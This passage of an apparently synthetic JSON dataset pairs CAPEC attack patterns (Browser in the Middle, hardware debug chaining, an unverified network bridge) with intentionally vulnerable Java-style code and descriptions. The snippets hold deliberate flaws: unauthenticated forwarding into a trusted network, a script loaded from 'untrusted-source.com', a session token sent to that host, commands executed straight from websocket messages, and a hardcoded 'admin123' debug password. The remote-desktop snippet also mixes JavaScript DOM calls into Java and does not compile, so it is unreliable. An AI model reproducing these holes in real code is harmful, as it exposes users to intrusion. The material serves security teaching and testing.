        "code_snippet": "public class NetworkBridge {\n    private Socket trustedSocket;\n    private Socket untrustedSocket;\n    private boolean isAuthenticated = false;\n\n    public void bridgeNetworks(String trustedNetwork, String untrustedNetwork) {\n        try {\n            // Establish connections without proper verification\n            trustedSocket = new Socket(trustedNetwork, 8080);\n            untrustedSocket = new Socket(untrustedNetwork, 8081);\n\n            // Direct data forwarding without validation or access control\n            InputStream untrustedInput = untrustedSocket.getInputStream();\n            OutputStream trustedOutput = trustedSocket.getOutputStream();\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n\n            // Forward data without checking message integrity or endpoint verification\n            while ((bytesRead = untrustedInput.read(buffer)) != -1) {\n                trustedOutput.write(buffer, 0, bytesRead);\n                trustedOutput.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a network bridge implementation that fails to properly verify endpoints, validate message integrity, or enforce access controls between trusted and untrusted networks. It creates a direct channel between networks without authentication, allowing potential unauthorized access and data manipulation during transmission."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "public class VulnerableRemoteDesktop {\n    private static final String REMOTE_SERVER = \"untrusted-source.com\";\n    private static String sessionToken = null;\n    \n    public static void establishConnection(String authToken) {\n        try {\n            // Accept any token without proper verification\n            sessionToken = authToken;\n            \n            // Load remote desktop widget from untrusted source\n            String widgetUrl = \"http://\" + REMOTE_SERVER + \"/remote-desktop.js\";\n            loadExternalScript(widgetUrl);\n            \n            // Client-side authentication without server validation\n            if(sessionToken != null) {\n                connectToRemoteDesktop(sessionToken);\n            }\n        } catch(Exception e) {\n            // Silently continue on error\n        }\n    }\n    \n    private static void loadExternalScript(String url) {\n        // Directly inject external script without validation\n        document.head.appendChild(createScriptElement(url));\n    }\n    \n    private static void connectToRemoteDesktop(String token) {\n        // No origin verification\n        websocket = new WebSocket(\"ws://\" + REMOTE_SERVER + \"/connect\");\n        websocket.send(token);\n        // Accept any incoming messages without verification\n        websocket.onmessage = (event) -> handleMessage(event.data);\n    }\n    \n    private static void handleMessage(String data) {\n        // Process all incoming messages without authentication\n        executeCommand(data);\n    }\n}",
        "description": "This code demonstrates a vulnerable remote desktop implementation that loads untrusted external scripts, fails to verify message authenticity, relies on client-side security, and doesn't properly validate session tokens. It allows capture-replay attacks and includes potentially malicious web functionality from an untrusted source."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "public class DebugController {\n    private static boolean isAuthenticated = false;\n    private static boolean debugEnabled = false;\n\n    public static void enableDebugMode(String credentials) {\n        // Global authentication without per-function checks\n        if(\"admin123\".equals(credentials)) {\n            isAuthenticated = true;\n            debugEnabled = true;\n        }\n    }\n\n    public static String readInternalRegisters() {\n        // No per-function authentication check\n        if(debugEnabled) {\n            return \"SENSITIVE_REGISTER_DATA\";\n        }\n        return null;\n    }\n\n    public static void injectTestData(byte[] data) {\n        // Missing granular access control\n        if(debugEnabled) {\n            // Directly writes to hardware registers without validation\n            writeToHardwareRegisters(data);\n        }\n    }\n\n    public static String getTraceData() {\n        // Unprotected trace data access\n        if(debugEnabled) {\n            return collectSensitiveTraceData();\n        }\n        return null;\n    }\n\n    private static void writeToHardwareRegisters(byte[] data) {\n        // Implementation omitted\n    }\n\n    private static String collectSensitiveTraceData() {\n        // Implementation omitted\n        return \"SENSITIVE_TRACE_DATA\";\n    }\n}",
        "description": "This vulnerable code demonstrates a debug controller with improper access control granularity. It uses a single global authentication flag for all debug functions instead of implementing per-function authorization checks. The code allows unrestricted access to internal registers, test modes, and sensitive trace data once debug mode is enabled. It also lacks proper validation for test data injection, which could compromise hardware redundancy and security-critical operations."
    }
]